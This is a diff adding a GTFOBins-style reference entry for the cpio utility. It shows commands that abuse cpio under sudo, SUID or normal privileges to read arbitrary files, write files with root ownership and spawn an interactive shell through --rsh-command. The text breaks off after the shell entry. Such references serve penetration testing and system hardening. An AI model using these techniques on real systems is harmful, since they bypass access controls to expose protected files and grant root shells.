@@ -1,0 +1,57 @@
+cpio
+====
+
+File read
+---------
+
+[Sudo]
+    echo /path/to/input-file | cpio -o
+    The content of the file is printed to standard output, between the `cpio` archive format header and footer.
+
+[SUID]
+    echo /path/to/input-file | cpio -o
+    The content of the file is printed to standard output, between the `cpio` archive format header and footer.
+
+[Unprivileged]
+    echo /path/to/input-file | cpio -o
+    The content of the file is printed to standard output, between the `cpio` archive format header and footer.
+
+[Sudo]
+    echo /path/to/input-file | cpio -R $UID -dp .
+cat path/to/input-file
+    The whole directory structure is copied to `.`, hence this is also a file write.
+
+[SUID]
+    echo /path/to/input-file | cpio -R $UID -dp .
+cat path/to/input-file
+    The whole directory structure is copied to `.`, hence this is also a file write.
+
+[Unprivileged]
+    echo /path/to/input-file | cpio -dp .
+cat path/to/input-file
+    The whole directory structure is copied to `.`, hence this is also a file write.
+
+File write
+----------
+
+[Sudo]
+    echo DATA >/path/to/temp-file
+echo /path/to/temp-file | cpio -R 0:0 -udp .
+    The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
+
+[SUID]
+    echo DATA >/path/to/temp-file
+echo /path/to/temp-file | cpio -R 0:0 -udp .
+    The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
+
+[Unprivileged]
+    echo DATA >/path/to/temp-file
+echo /path/to/temp-file | cpio -udp .
+    The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.
+
+Shell
+-----
+
+[Sudo]
+    echo '/bin/sh </dev/tty >/dev/tty' >localhost
+cpio -o --rsh-command /bin/sh -F localhost:
